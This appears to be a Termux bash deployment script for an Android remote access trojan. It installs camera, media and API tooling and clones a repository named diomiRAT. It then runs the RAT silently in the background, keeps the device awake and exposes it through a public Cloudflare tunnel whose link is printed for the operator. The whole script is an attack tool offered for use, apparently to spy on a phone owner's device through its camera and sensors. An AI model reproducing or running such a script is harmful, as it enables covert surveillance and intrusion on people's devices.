#!/bin/bash
clear
pkg update -y
pkg install -y python termux-api ffmpeg cloudflared
pip install flask opencv-python pillow --quiet
cd $HOME
rm -rf rat
git clone https://github.com/Diomi1/diomiRAT rat
cd rat
chmod +x quickrat.py
pkill -f quickrat.py
pkill -f cloudflared
termux-wake-lock
nohup python quickrat.py > /dev/null 2>&1 &
nohup cloudflared tunnel --url http://localhost:5000 > /dev/null 2>&1 &
sleep 12
echo "════════════════════════"
cloudflared tunnel --url http://localhost:5000 2>/dev/null | grep -o "https://.*trycloudflare.com" | head -1
echo "════════════════════════"
echo "Guarda ese enlace. Listo."
